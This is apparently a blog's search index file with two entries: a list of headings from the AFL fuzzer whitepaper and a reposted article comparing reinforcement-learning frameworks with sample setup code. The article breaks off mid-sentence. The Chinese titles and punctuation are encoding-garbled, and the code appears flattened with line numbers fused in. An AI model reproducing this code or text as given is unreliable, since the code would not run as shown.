<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[æ¨¡ç³Šæµ‹è¯•ç›¸å…³èµ„æ–™æ”¶é›†]]></title>
    <url>%2F2019%2F12%2F29%2F%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[æœé›†ä¸€äº›æ¨¡ç³Šæµ‹è¯•ç›¸å…³çš„èµ„æ–™ï¼ŒåŒ…æ‹¬æœ€åˆæ¥æºï¼Œå¯ä»¥ç”¨äºŽè®ºæ–‡å¼•ç”¨ã€‚ Technical â€œwhitepaperâ€ for afl-fuzz AFLæŠ€æœ¯ç™½çš®ä¹¦ Design statement Coverage measurements branch (edge) coverage provides considerably more insight into the execution path of the program than simple block coverage coarse branch-taken hit counts shared_mem[] 64 kB SHM Every byte : a hit for a particular (branch_src, branch_dst) tuple Detecting new behaviors Evolving the input queue Culling the corpus Trimming input files Fuzzing strategies Dictionaries De-duping crashes Investigating crashes The fork server copy-on-write Parallelization Binary-only instrumentation The afl-analyze tool]]></content>
      <categories>
        <category>æ¨¡ç³Šæµ‹è¯•</category>
      </categories>
      <tags>
        <tag>æ¨¡ç³Šæµ‹è¯•</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¸¸è§å¼ºåŒ–å­¦ä¹ æ¡†æž¶æ¯”è¾ƒ]]></title>
    <url>%2F2019%2F12%2F24%2F%E5%B8%B8%E8%A7%81%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E6%A1%86%E6%9E%B6%E6%AF%94%E8%BE%83%2F</url>
    <content type="text"><![CDATA[A Comparison of Reinforcement Learning Frameworks: Dopamine, RLLib, Keras-RL, Coach, TRFL, Tensorforce, Coach and more ï¼ˆåŽŸæ–‡ä¸­çš„è§†é¢‘å’Œè°·æ­Œè¶‹åŠ¿å›¾å¯åˆ°åŽŸæ–‡ä¸­æŸ¥çœ‹ï¼‰ æ–‡ä¸­æœªæ¶‰åŠçš„æ¡†æž¶ï¼š Baselines rlpyt Reinforcement Learning (RL) frameworks help engineers by creating higher level abstractions of the core components of an RL algorithm. This makes code easier to develop, easier to read and improves efficiency. But choosing a framework introduces some amount of lock in. An investment in learning and using a framework can make it hard to break away. This is just like when you decide which pub to visit. Itâ€™s very difficult not to buy a beer, no matter how bad the place is. In this post I provide some notes about the most popular RL frameworks available. I also present some crude summary statistics from Github and Google (which you canâ€™t trust) to attempt to quantify their popularity. I believe posts like this are useful, but sometimes people are upset because I donâ€™t like something about their framework. I do not want to upset anyone. If I do, Iâ€™m sorry. The work performed by the framework authors is nothing less than extraordinary. This is my meagre interpretation using the little time I have available. Please contact me to make corrections. Original Purpose of this WorkI am writing a book on RL for Oâ€™Reilly. As a part of that book, I want to demonstrate to my readers how to build and design various RL agents. I think the readers will benefit by using code from an already-established framework or library. And in any case, the people writing these frameworks would probably do a better job than I could anyway. So the question was, â€œwhich framework?â€. Which led me down this path. It started with a few frameworks, but then I found more. And more. And it turns out there are quite a lot of frameworks already available, which turned this into a 8000 word monster. Apologies in advance for the length. I donâ€™t expect many people to read all of it! Because of the length, this also took a while to write. This means that the reviews donâ€™t have laser-focus. Sometimes I comment about one thing in one framework and not at all in another. Apologies for this; it was not intended to be exhaustive. MethodologyMost of the evaluation is pure opinion. But there are a few quantitative metrics we can look at. Namely the statistics of the repository that are made available in Github. Starts roughly represent how well known each of the frameworks are, but they do not represent quality. More often than not the frameworks with the most stars have more marketing power. After that, I was looking for a combination of modularity, ease of use, flexibility and maturity. Simplicity was also desired, but this is usually mutually exclusive with modularity and flexibility. The opinions presented below are based upon these ideals. One reoccurring theme is the dominance of Deep Learning (DL) frameworks within the RL framework. Quite often the DL framework would breakout above the abstractions and the RL framework would just be an extension of the former. This means that if you are in a situation where you are already in bed with a particular DL solution, then you might as well stick with that. But to me, that represents lock-in. My preference would always tend towards the frameworks that donâ€™t mandate a specific DL implementation or donâ€™t use DL at all (shock/horror!). The result is that all the Google frameworks tend towards Tensorflow, all the academic frameworks use PyTorch then there are a few brave souls dangling in-between with twice as much work as everyone else. I also attempted to look at the Google rankings for each framework, but that turned out to be unreliable. Accompanying NotebookWhere I could, or where it made sense, I tried out a lot of these frameworks. Many of them didnâ€™t work. And some of them had excellent Notebooks to begin with, so you can just check those out. For the rest, I have published a gist that you can run on Google Colabratory. This is presented in a very raw format. It is not meant to be comprehensive or explanatory. I simply wanted to double check that in the simplest of cases, it worked. In each section I also present a â€œGetting Startedâ€ sub-heading that demonstrates the basic example from each framework. This code is from the Notebook. Reinforcement Learning FrameworksThe following frameworks are listed in order of the number of stars in their Github repository as of June 2019. The actual number of stars and other metrics are presented as badges just below the title of each framework. The following frameworks are compared: OpenAI Gym Google Dopamine RLLib Keras-RL TRFL Tensorforce Facebook Horizon Nervana Systems Coach MAgent SLM-Lab DeeR Garage Surreal RLgraph Simple RL OpenAI Gym OpenAI is a not-profit, pure research company. The provide a range of open-source Deep and Reinforcement Learning tools to improve repeatability, create benchmarks and improve upon the state of the art. I like to think of them as a bridge between academia and industry. But I know what youâ€™re thinking. â€œPhil, Gym is not a framework. It is an environment.â€. I know, I know. It provides a range of toy environments, classic control, robotics, video games and board games to test your RL algorithm against. But I have included it here because it is used so often as the basis for custom work. People use it like a framework. Think of it as an interface between an RL implementation and the environment. It is so prolific, many of the other frameworks listed below also interface with Gym. Furthermore it acts as a baseline as to compare everything against. Since this is one of the most popular repositories in RL. Getting StartedGym is both cool and problematic because of itâ€™s realistic 3D environments. If you want to visualise what is going on you need to be able to render these environments. It pretty much works on your laptop, but struggles when you try and run it in a Notebook because of limitations with the browser. To work around this, you have to use a virtual display. Basically we have to mock out the video driver. This means most of the â€œgetting startedâ€ code is video wrapping code. If we ignore all the boring stuff, which you can find in the accompanying Notebook, the core gym code looks like: 1234567891011121314import gymfrom gym.wrappers.monitoring.video_recorder import VideoRecorder # Because we want to record a videoenv = gym.make("CartPole-v1") # Create the cartpole environmentrec = VideoRecorder(env) # Create the video recorderrec.capture_frame() # Capture the starting positionwhile True: action = env.action_space.sample() # Use a random action observation, reward, done, info = env.step(action) # to take a single step in the environment rec.capture_frame() # and record if done: break # If the pole has fallen, quit.rec.close() # Close the recordingenv.close() # Close the environment As you can see, it falls straight away because weâ€™re just passing random actions at the moment. But still, thereâ€™s something hypnotic, something drum-and-bass about it. But now letâ€™s look at some agent framework only options. Google Dopamine Google Dopamine: â€œNot an Official Google productâ€ (NOGP - an acronym Iâ€™m going to coin now) but written by Google employees and hosted on Google github. So, Google Dopamine then. It is a relatively new entrant to the RL framework space that appears to have been a hit. It boasts a large number of Github stars and some amount of Google trend ranking. This is especially surprising because of the limited number of commits, committers and time since the project was launched. Clearly it helps you have Googleâ€™s branding and marketing department. Anyway, the cool thing about this framework is that it emphasises configuration as code through itâ€™s use of the Google gin-config configuration framework. The idea is that you have lots of pluggable bits that you plumb together through a configuration file. The benefit is that this allows people to release a single configuration file that contains all of the parameters specific to that run. And gin-config makes things special because it allows you to plumb together objects; instances of classes and lambdas and things like that. The downside is that you increase the complexity in the configuration file and it can end up like just another file full of code that people canâ€™t understand because they are not used to it. Personally I would always stick to a â€œdumbâ€ configuration file like Kubernetes Manifests or JSON (like many of the other frameworks), for example. The wiring should be done in the code. The one major benefit is that it promotes plugability and reuse, which are key OOP and Functional concepts that are often ignored when developing Data Science products. It is clear that it has gained a significant amount of traction in a very short time. And frankly, that worries me a bit. There are four contributors and only 100 commits. Of those four people, three are from the community (bug-fixes, etc.). This leaves one person. And this one person has committed, wait for it, over 1.3 million lines of code. Clearly thereâ€™s something fishing going on here. From the commit history it looks like the code was transferred from another repo. A 1.2 million line commit isnâ€™t exactly best practice! :-) Itâ€™s Apache licensed, so thereâ€™s nothing too strange going on but the copyright has been assigned to Google Inc.. But Iâ€™m reassured by the contributor agreement. In terms of modularity, there isnâ€™t much. There isnâ€™t any abstraction for the Agents; they are implemented directly and configured from the gin config. Thereâ€™s not many implemented either. There isnâ€™t any official abstraction of an environment either. In fact, it looks like they are just passing back core Tensorflow objects everywhere and assuming using the Tensorflow interface. In short, very little official OOP-style abstraction, which is different to most of the other frameworks. In short, little modularity, reuse is clunky (IMO) and although it appears to be popular, it isnâ€™t very mature and doesnâ€™t have community support. Getting StartedAgain you can find the example in the accompanying Notebook, but the premise is to build your RL algorithm via a configuration file. This is what it looks like: 12345678910111213141516171819202122232425262728293031323334353637383940DQN_PATH = os.path.join(BASE_PATH, 'dqn')# Modified from dopamine/agents/dqn/config/dqn_cartpole.gindqn_config = """# Hyperparameters for a simple DQN-style Cartpole agent. The hyperparameters# chosen achieve reasonable performance.import dopamine.discrete_domains.gym_libimport dopamine.discrete_domains.run_experimentimport dopamine.agents.dqn.dqn_agentimport dopamine.replay_memory.circular_replay_bufferimport gin.tf.external_configurablesDQNAgent.observation_shape = %gym_lib.CARTPOLE_OBSERVATION_SHAPEDQNAgent.observation_dtype = %gym_lib.CARTPOLE_OBSERVATION_DTYPEDQNAgent.stack_size = %gym_lib.CARTPOLE_STACK_SIZEDQNAgent.network = @gym_lib.cartpole_dqn_networkDQNAgent.gamma = 0.99DQNAgent.update_horizon = 1DQNAgent.min_replay_history = 500DQNAgent.update_period = 4DQNAgent.target_update_period = 100DQNAgent.epsilon_fn = @dqn_agent.identity_epsilonDQNAgent.tf_device = '/gpu:0' # use '/cpu:*' for non-GPU versionDQNAgent.optimizer = @tf.train.AdamOptimizer()tf.train.AdamOptimizer.learning_rate = 0.001tf.train.AdamOptimizer.epsilon = 0.0003125create_gym_environment.environment_name = 'CartPole'create_gym_environment.version = 'v0'create_agent.agent_name = 'dqn'TrainRunner.create_environment_fn = @gym_lib.create_gym_environmentRunner.num_iterations = 100Runner.training_steps = 100Runner.evaluation_steps = 100Runner.max_steps_per_episode = 200 # Default max episode length.WrappedReplayBuffer.replay_capacity = 50000WrappedReplayBuffer.batch_size = 128"""gin.parse_config(dqn_config, skip_unknown=False) Thatâ€™s quite a lot. But itâ€™s implementing a more complicated algorithm so we might expect that. Iâ€™m quite happy about the hyperparameters being in there, but Iâ€™m not sure that I am a fan of all the dynamic injection (the @ denotes an instance of a class). Proponents would say that â€œwow, look, I can just swap out the optimiser just by changing this lineâ€. But Iâ€™m of the opinion that I could do that with plain old Python too. After a bit of training: 123tf.reset_default_graph()dqn_runner = run_experiment.create_runner(DQN_PATH, schedule='continuous_train')dqn_runner.run_experiment() Then we can run some similar code to before to generate a nice video: 123456789101112rec = VideoRecorder(dqn_runner._environment.environment)action = dqn_runner._initialize_episode()rec.capture_frame()while True: observation, reward, is_terminal = dqn_runner._run_one_step(action) rec.capture_frame() if is_terminal: break # If the pole has fallen, quit. else: action = dqn_runner._agent.step(reward, observation)dqn_runner._end_episode(reward)rec.close() RLLib via ray-project Ray started life as a project that aimed to help Python users build scalable software, primarily for ML purposes. Since then it has added several modules that are dedicated to specific ML use cases. One is distributed hyperparameter tuning and the other is distributed RL. The consequence of this generalisation is that the popularity numbers are probably more due to the hyperparameter and general purpose scalability use case, rather than RL. Also, the distributed focus of the library means that the agent implementations tend to be those that are inherently distributed (e.g. A3C) or are attempting to solve problems that are so complex they need distributing so that they donâ€™t take years to converge (e.g. Rainbow). Despite this, if you are looking to productionise RL, or if you are repeating training many times for hyperparameter tuning or environment improvements, then it probably makes sense to use ray to be able to scale up and reduce feedback times. In fact, a number of other frameworks (specifically: SLM-Lab and RLgraph) actually use ray under the hood for this purpose. I believe there is a strong applicability to RL here. The clear focus on distributed computation is good.The sheer number of commits and contributors is also reassuring. But there is a lot of the underlying code in C++. Some even in Java. Only 60% is python. Despite this there is a very clear abstraction for Policys, a nice, almost functional interface for agents called Trainers (see the DQN implementation for an example of its usage), a Model abstraction that allows the use of PyTorch or Tensorflow (yay!) and a few more for evaluation and policy optimisation. Overall the documentation is excellent and clear architectural drawings are presented (see this example, for example). It is modular, scales well and is very well supported and accepted by the community. The only downside is the complexity of it all. Thatâ€™s the price you pay for all this functionality. Getting StartedThere is an issue with the version of pyarrow preinstalled in Google colab that isnâ€™t compatible with ray. You have to uninstall the preinstalled version and restart the runtime, then it works. I also couldnâ€™t get the video rendering working in the same way we made the previous examples work. My hypothesis is that because they are running in separate processes they donâ€™t have access to the fake pyvirtualdisplay device. So despite this, let us try an example: 12!pip uninstall -y pyarrow!pip install tensorflow ray[rllib] &gt; /dev/null 2&gt;&amp;1 After you remove pyarrow and install rllib, you must restart the Notebook kernel. Next, import ray: 1234import rayfrom ray import tuneray.init() And run a hyperparameter tuning job for the Cartpole environment using a DQN: 1234567891011tune.run( "DQN", stop=&#123;"episode_reward_mean": 100&#125;, config=&#123; "env": "CartPole-v0", "num_gpus": 0, "num_workers": 1, "lr": tune.grid_search([0.01, 0.001, 0.0001]), "monitor": False, &#125;,) There is a lot of syntactic sugar here, but it looks reasonably straightforward to customise the training functionality (docs). Keras-RL I love Keras. I love the abstraction, the simplicity, the anti-lock-in. When you look at the code below you can see the Keras magic. So you would think that keras-rl would be a perfect fit. However it doesnâ€™t seem to have obtained as much traction as the other frameworks. If you look at the documentation, itâ€™s empty. When you look at the commits there only a few brave souls that have done most of the work. Compare this to the main Keras project. And I think I might know why. Keras was built from the ground up to allow users to quickly prototype different DL structures. This relied on the fact that the Neural Network primitives could be abstracted and modular. But when you look at the code for keras-rl, itâ€™s implemented like it is in the textbooks. Each agent has itâ€™s own implementation despite the similarities between SARSA and DQN, for example. Think of all the â€œtricksâ€ that could be modularised, tricks like those that are used for Rainbow, which could allow people to experiment using these tricks in other agents. There is some level of modularity, but I think it is at a level that is too high. But maybe itâ€™s not too late, because there is so much promise here. If there were enough people interested, or maybe if there was more support from the core Keras project, then maybe this could be the go-to RL framework of the future. But for now, I donâ€™t think it is. Itâ€™s almost as easy to obtain the benefits of Keras by using other frameworks that we have already discussed. Getting StartedThe examples worked out of the box here and the only modifications I made were to use a mock Display and add some video recording of the tests. You can see that most of the code here is standard Keras code. The additions by Keras-RL arenâ€™t really Keras related at all. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import numpy as npimport gymfrom keras.models import Sequentialfrom keras.layers import Dense, Activation, Flattenfrom keras.optimizers import Adamfrom rl.agents.dqn import DQNAgentfrom rl.policy import BoltzmannQPolicyfrom rl.memory import SequentialMemoryENV_NAME = 'CartPole-v0'# Get the environment and extract the number of actions.env = gym.make(ENV_NAME)np.random.seed(123)env.seed(123)nb_actions = env.action_space.n# Next, we build a very simple model.model = Sequential()model.add(Flatten(input_shape=(1,) + env.observation_space.shape))model.add(Dense(16))model.add(Activation('relu'))model.add(Dense(16))model.add(Activation('relu'))model.add(Dense(16))model.add(Activation('relu'))model.add(Dense(nb_actions))model.add(Activation('linear'))print(model.summary())# Finally, we configure and compile our agent. You can use every built-in Keras optimizer and# even the metrics!memory = SequentialMemory(limit=5000, window_length=1)policy = BoltzmannQPolicy()dqn = DQNAgent(model=model, nb_actions=nb_actions, memory=memory, nb_steps_warmup=10, target_model_update=1e-2, policy=policy)dqn.compile(Adam(lr=1e-3), metrics=['mae'])# Okay, now it's time to learn something! We visualize the training here for show, but this# slows down training quite a lot. You can always safely abort the training prematurely using# Ctrl + C.dqn.fit(env, nb_steps=2500, visualize=True, verbose=2)# After training is done, we save the final weights.dqn.save_weights('dqn_&#123;&#125;_weights.h5f'.format(ENV_NAME), overwrite=True)# Finally, evaluate our algorithm for 5 episodes.dqn.test(Monitor(env, '.'), nb_episodes=5, visualize=True) TRFL TRFL is an opinionated extension to Tensorflow by Deepmind (so NOGP then ;-) ). Given the credentials you would have expected it to be popular, but the first thing you notice is the distinct lack of commits. Then the distinct lack of examples and Tensorflow 2.0 support. The main issue is that it is too low-level. Itâ€™s the exact opposite of Keras-RL. The functionality that TRFL provides is a few helper functions, a q-learning value function for example, which takes in a load of Tensorflow Tensors with abstract names. Getting StartedI recommend taking a quick look at this Notebook as an example. But note that the code is very low level. Tensorforce Tensorforce has similar aims to TRFL. It attempts to abstract RL primitives whilst targeting Tensorflow. By using Tensorflow then you gain all of the benefits of using Tensorflow, i.e. graph models, easier, cross-platform deployment. There are four high-level abstractions of an Environment, Runner, Agent and Model. These mostly do what you would expect, but the â€œModelâ€ abstraction is not something you would normally see. A Model sits within an Agent and defines the policy of the agent. This is nice because, for example, the standard Q-learning model can be overridden by the Q-learning n-step model, only changing one small function. This is precisely the middle ground between TRFL and Keras that I was looking for. And itâ€™s implemented in an OOP way, which some people will like, others wont. But at least the abstraction is there. The downside of libraries like this, or any DL focused RL library, is that much of the code is complicated by the underlying DL framework. The same is true here. For example, the random model, i.e. one that chooses a random action, something that should take precisely one line of code, is 79 lines long. Iâ€™m being a little facetious here (license, class boilerplate, newlines, etc.) but hopefully you understand my point. It also means that there is no implementation of â€œsimpleâ€ RL algorithms, i.e. those that donâ€™t use models. E.g. entropy, bandits, simple MDPs, SARSA, some tabular methods, etc. And the reason for this is that you donâ€™t need a DL framework for these models. So in summary, I think the level of abstraction is spot on. But the benefits/problems of limiting yourself to a DL framework remain. Note that this is based upon version 0.4.3 and a major rewrite is underway. Getting StartedThe getting started example is sensible. Weâ€™re creating an environment, an agent and a runner (the thing that actually does the training). The specifications for the agent is a little different though. It reminds me of the Dopamine Gin config, except itâ€™s using standard json. In the example Iâ€™m getting those specifications from their examples directory, but you can imagine how easy it would be to run a hyperparameter search using them. 123456789101112131415161718192021222324252627282930313233343536373839environment = OpenAIGym( gym_id="CartPole-v0", monitor=".", monitor_safe=False, monitor_video=10, visualize=True)with urllib.request.urlopen("https://raw.githubusercontent.com/tensorforce/tensorforce/master/examples/configs/dqn.json") as url: agent = json.loads(url.read().decode()) print(agent)with urllib.request.urlopen("https://raw.githubusercontent.com/tensorforce/tensorforce/master/examples/configs/mlp2_network.json") as url: network = json.loads(url.read().decode()) print(network)agent = Agent.from_spec( spec=agent, kwargs=dict( states=environment.states, actions=environment.actions, network=network ))runner = Runner( agent=agent, environment=environment, repeat_actions=1)runner.run( num_timesteps=200, num_episodes=200, max_episode_timesteps=200, deterministic=True, testing=False, sleep=None)runner.close() Facebook Horizon Horizon is a framework from Facebook that is dominated by PyTorch. Another DL focused library then. Also: The main use case of Horizon is to train RL models in the batch setting. &hellip; Specifically, we try to learn the best possible policy given the input data. So like other frameworks the focus is off-policy, model driven RL with DL in the model. But this is differentiated due to the use of PyTorch. You could also compare this to Keras-RL using PyTorch as the backend for Keras. Iâ€™ve already discussed the cons of such a focused framework in the Tensorforce section, so I wonâ€™t state them again. There are several interesting differences though. There is no tight Gym integration. Instead they intentionally decouple the two by dumping Gym data into JSON, then reading the JSON back into the agent. This might sound verbose, but is actually really good for decoupling and therefore more scalable, less fragile and more flexible. The downside is that there are more hoops to jump through due to the increased complexity. However, as inconceivable as it sounds, there is no pip installer for Horizon. You have to use conda, install onnx, install java, setup the JAVA_HOME to point to conda, install Spark, install Gym (fair enough), install Apache thrift and then build Horizon. Wow. (Bonus points if you counted how many steps that was). So I think it suffice to say that Iâ€™m not going to attempt to install this in the demo Notebook. Getting StartedYouâ€™ll need a lot of time and a lot of patience. Follow the build instructions, then follow the training guide. I canâ€™t vouch for it because I have a life to get on with. Nervana Systems Coach The first thing you will notice when you look at this framework is the number of implemented algorithms. It is colossal and must have taken several people many weeks to implement. The second thing you will notice is the number of integrated Environments. Considering how much time this must have taken, it gives a lot of hope for the rest of the framework. It comes with a dedicated dashboard which looks pretty nice. Most of the other frameworks rely on the Tensorboard project. One particular wow feature that I havenâ€™t seen before, is inbuilt deployment for Kubernetes. I think that the orchestration of Coach by Coach is a step too far, but the fact that theyâ€™ve even thought about it means that it is probably scalable enough to deploy onto Kuberentes with standard tooling. The level of modularity is astounding. For example there are classes that implement all sorts of exploration strategies and allow you to make all sorts of changes to the various model designs. The ONLY thing that I can think of that is a little annoying is the same limitation of forcing me to use DL as the model. I remain convinced that a subset of simpler applications do not require anything nearly as complex as DL and could benefit for more traditional Regression methods. However, Iâ€™m sure it should be reasonably easy to add in a little stub class that removes the DL stuff. Interestingly, the framework supports Tensorflow and MXNet due to itâ€™s use of Keras. This means that PyTorch is not supported, because Keras doesnâ€™t support PyTorch. Frankly, I canâ€™t understand why this framework is so unpopular in any way of measuring it. In terms of stars. In terms of the number of google pages (the answer is 7, if you are wondering). Compare that to Google Dopamine for example, with 16500 pages. It is certainly the most comprehensive framework with the best documentation and a fantastic level of modularity. Theyâ€™ve even got a â¤ï¸ Getting Started Notebook â¤ï¸. Getting StartedThere are two important notes Iâ€™d like to point out. First, make sure you are looking at a tagged version of the documentation or the demos. There are some new features in the master branch that donâ€™t work with a pip installed version. Second, it depends on OpenAI Gym version 0.12.5, which isnâ€™t installed in colab. Youâ€™ll need to run !pip install gym==0.12.5 and restart the runtime. 12345678910111213141516171819202122232425import tensorflow as tftf.reset_default_graph() # So that we don't get an error for TF when we re-runfrom rl_coach.agents.clipped_ppo_agent import ClippedPPOAgentParametersfrom rl_coach.environments.gym_environment import GymVectorEnvironmentfrom rl_coach.graph_managers.basic_rl_graph_manager import BasicRLGraphManagerfrom rl_coach.graph_managers.graph_manager import ScheduleParametersfrom rl_coach.core_types import TrainingSteps, EnvironmentEpisodes, EnvironmentStepsfrom rl_coach.base_parameters import VisualizationParametersglobal experiment_path; experiment_path = '.' # Because of some bizzare global in the mp4 dumping code# Custom schedule to speed up training. We don't really care about the results.schedule_params = ScheduleParameters()schedule_params.improve_steps = TrainingSteps(200)schedule_params.steps_between_evaluation_periods = EnvironmentSteps(200)schedule_params.evaluation_steps = EnvironmentEpisodes(10)schedule_params.heatup_steps = EnvironmentSteps(0)graph_manager = BasicRLGraphManager( agent_params=ClippedPPOAgentParameters(), env_params=GymVectorEnvironment(level='CartPole-v0'), schedule_params=schedule_params, vis_params=VisualizationParameters(dump_mp4=True) # So we can dump the video) MAgent MAgent is a framework that allows you to solve many-agent RL problems. This is a completely different aim compared to all the other â€œtraditionalâ€ RL frameworks that use only a single or very few agents. They claim it can scale up to millions of agents. But again, no pip installer. Please, everyone, create pip installers for you projects. Itâ€™s vitally important for ease of use and therefore project traction. I guess itâ€™s because the whole project is written in C, presumably for performance reasons. Itâ€™s using Tensorflow under the hood and builds its own gridworld-like enironment. The Agents are designed with â€œreal-lifeâ€ simulations in mind. For example you can specify the size of the agent, how far it can see; things like that. The observations that are passed to the Agents are grids. The actions that they can take are limited to moving, attacking and turning. They are rewarded according to a flexible rule definition. In short, the framework is setup to handle game of life style games out of the box, with some extra modularity on how the agents behave and are rewarded. Due to this we can use some of the more advanced DL methods to train the agents to perform complex, coordinated tasks. Like surround prey so that it canâ€™t move. You can learn more in the getting started guide. I am very impressed with the idea. But as you can see from the Github stats above, 4 commits a year basically means that it is hardly being used. The last major updates were in 2017. This is a shame, because it represents something very different compared to the other frameworks. It would be great if someone could make it easier to use, or replicate the framework in idiomatic Python, so that it becomes easier to use. Getting StartedSo I almost got it working in the Notebook. I tried a few examples from the getting started guide. The training version takes hours, so I bailed on that quite quickly. The examples/api_demo.py however is just testing the learnt models, so that is lightning quick. However, it renders the environment in some proprietary text format. You need to run a random webserver binary that parses and hosts the render in the browser. Because weâ€™re in colab, it doesnâ€™t allow you to run a webserver. So I tried downloading the files, but we built the binaries on colab, not on a mac, so I wasnâ€™t able to run the binary. So that was a bit frustrating. It would have been much simpler if it had just rendered it in some standard format like mp4 of a gif or something. And also disappointing, because I was looking forward to generating some complex behavior. But just so you are not disappointed, here is some eye candy from the author. Please excuse the audio! And here are the remains of the code that worked: 123456!git clone https://github.com/geek-ai/MAgent.git!sudo apt-get install cmake libboost-system-dev libjsoncpp-dev libwebsocketpp-dev%cd MAgent!bash build.sh!PYTHONPATH=$(pwd)/python:$PYTHONPATH python examples/api_demo.py You can exchange that last call to any of the python files in teh examples folder. TF-Agents Tensorflow-Agents (TF-Agents) is another NOGP from Google with the focus squarely on Tensorflow. So treat this as direct competition to TRFL, Tensorforce and Dopamine. Which begs the question: why have more Google employees created another Tensorflow-abstraction-for-RL when TRFL and Dopamine already exist? In an issue discussing the relationship between TF-Agents and Dopamine the contributors suggest that: it seems that Dopamine and TF-Agent strongly overlap. Although dopamine aims at being used for fast prototyping and benchmarking as the reproducibility has been put at the core of the project, whereas TF-Agent would be more used for production-level reinforcement learning algorithms. To be honest, Iâ€™m not sure what â€œproduction-levelâ€ means at this point. There are some great colab examples, but there is no documentation. And you certainly shouldnâ€™t be using Notebooks in production. Once you start digging into the examples, then it becomes clear that the code is very Tensorflow heavy. For example, the simple Cartpole example has a lot of lines of code. Mainly because there is a lot of explanation and debuging code in there, but it looks like a sign of things to come. I must admit though, the code does look very nice. Itâ€™s nicely separated and the modularity looks good. All the abstractions you would expect are there. The only thing I want to pick on is the Agent abstraction. This is the base class and it is directly coupled to Tensorflow. It is a Tensorflow module. This adds a significant amount of complexity and I wish that it was abstracted away so I didnâ€™t have to worry about it until I need it. The same is true for the vast majority of other abstractions; they are all Tensorflow modules. With that said, it is clear that this is a far more serious and capable library than TRFL. Getting StartedThere is already an extensive set of Notebooks available in their repository, so I wonâ€™t waste time just copy and pasting here. You can also run them directly in colab too. The video below shows three episodes of the cartpole. To me it looks like it is having a fit. Constant nudges to rebalance. SLM-Lab SLM-Lab is modular RL framework based upon PyTorch. It appears to be aimed more towards researchers. They stress the importance of modularity, but rightly state that being simple and modular is probably not possible; it is a compromise between the two. Interestingly it also uses the Ray project under the hood to make it scalable. Despite starting in 2017, the small number of contributors and the relative popularity in terms of github stars, there is lots of activity. The vast majority of the commits are one-liners, but the commitment by the authors is amazing. Unfortunately this is another non-pip install framework and attempts to install a whole load of build related C libraries and miniconda. Which is problematic in colab. Being a good Engineer I ignored all the documentation and tried to get it working myself through trial and error. It almost worked, but I stumbled across a problem when initialising pytorch that I didnâ€™t know how to fix. So unfortunately, again, you will have to settle for an example image from the authors. I struggled a bit with the documentation. The architecture documentation is limited and the rest is focused towards usage. But by usage I mean running experiments on current implementations. I struggled to find the documentation that told me how to plug modules together in different ways. I presume they intend that this should be done via the JSON spec files. Indeed the original motivation was: There was a need for a framework that would allow us to compare algorithms and environments, quickly set up experiments to test hypotheses, reuse components, analyze and compare results, log results. So the goal here is to allow reuse via configuration, much like Dopamine and Tensorforce. This â€œRL as configurationâ€ seems to be a theme! However, Iâ€™m not convinced. I would argue that code is more idiomatic, more flexible. It is what people are used to. Every time you do something via configuration that is another Domain Specific Language (DSL) that users have to learn. And because that DSL is generally static (Gin is not) then the implementation of the DSL sets the limitation. It is never going to suit everyone because there will be an edge case that isnâ€™t covered by the DSL. DeeR The initial impression of DeeR is a good one. It has a pip installer. It waxes lyrical about modularity. It has only two Python dependencies; numpy and Joblib. So no nasty C make process to get it working, great! The documentation is clear, but is missing some overall architecture documentation. You have to dig into the classes/code to find the documentation. But when you do it is good. The â€œmodulesâ€ are split mostly in the way you would expect. Modules for the Environment, Agent, and Policies. There is an interesting class called Controller which is not standard. This class provides lifecycle hooks that you can attach to; events like the end of an episode or whenever an action is taken. For example, if you wanted to do some logging at the end of an episode, then you could subclass this class and override the onEpisodeEnd. There are several example controllers, one of which is an EpsilonController. This allows you to dymaically alter the eta or epsilon value in e-greedy algorithms. This is quite powerful as it allows you to alter the learning process in mid flight. But from a Software Engineering perspective this is quite risky. Any Functional Programmer will tell you not to mutate the state of another object because â€œDragons be hereâ€. It would have been nicer if the API was more functional and you could pass in functions that computed, for example, the agentâ€™s next eta, rather than mutating the state of the agent directly. This may make it slightly more complex, though. The framework also contains a few learning algorithms but itâ€™s certainly not as comprehensive as something like Coach. Getting StartedThanks to the pip install and very few dependencies, this was probably the easiest framework to get up and running. 12!pip install git+git://github.com/VINF/deer.git@master!git clone https://github.com/VinF/deer.git I cloned the git repo so I could run the examples. Then itâ€™s just a case of importing everything: 123456%cd /content/deer/examples/toy_envimport numpy as npfrom deer.agent import NeuralAgentfrom deer.learning_algos.q_net_keras import MyQNetworkfrom Toy_env import MyEnv as Toy_envimport deer.experiment.base_controllers as bc And stealing the example: 12345678910111213141516171819202122232425262728293031323334353637rng = np.random.RandomState(123456)# --- Instantiate environment ---env = Toy_env(rng)# --- Instantiate qnetwork ---qnetwork = MyQNetwork( environment=env, random_state=rng)# --- Instantiate agent ---agent = NeuralAgent( env, qnetwork, random_state=rng)# --- Bind controllers to the agent ---# Before every training epoch, we want to print a summary of the agent's epsilon, discount and# learning rate as well as the training epoch number.agent.attach(bc.VerboseController())# During training epochs, we want to train the agent after every action it takes.# Plus, we also want to display after each training episode (!= than after every training) the average bellman# residual and the average of the V values obtained during the last episode.agent.attach(bc.TrainerController())# All previous controllers control the agent during the epochs it goes through. However, we want to interleave a# "test epoch" between each training epoch. We do not want these test epoch to interfere with the training of the# agent. Therefore, we will disable these controllers for the whole duration of the test epochs interleaved this# way, using the controllersToDisable argument of the InterleavedTestEpochController. The value of this argument# is a list of the indexes of all controllers to disable, their index reflecting in which order they were added.agent.attach(bc.InterleavedTestEpochController( epoch_length=500, controllers_to_disable=[0, 1]))# --- Run the experiment ---agent.run(n_epochs=100, epoch_length=1000) Here we are instantiating an environment, creating the Q-Learning algorithm and creating the agent that uses that algorithm. Next we use the .attach() function on the agent to appen all of these Controllers we have been talking about. They add logging and interleave training periods and testing periods. If we wanted to edit any of this we just need to reimplement the piece that weâ€™re interested in. Great! The only issue was that the toy example didnâ€™t work! Iâ€™m not sure why, but itâ€™s probably something silly. The training values looked a little weird in that the test score was always 0, and the training loss increased over time. Maybe it got stuck. Not sure. Iâ€™m sure itâ€™s something silly. Garage Garage is a follow-on from rllab with the same aims, but just community, rather than individual support. The documentation is a little sparse. For instance, it doesnâ€™t highlight that it implements a large number of algorithms. And 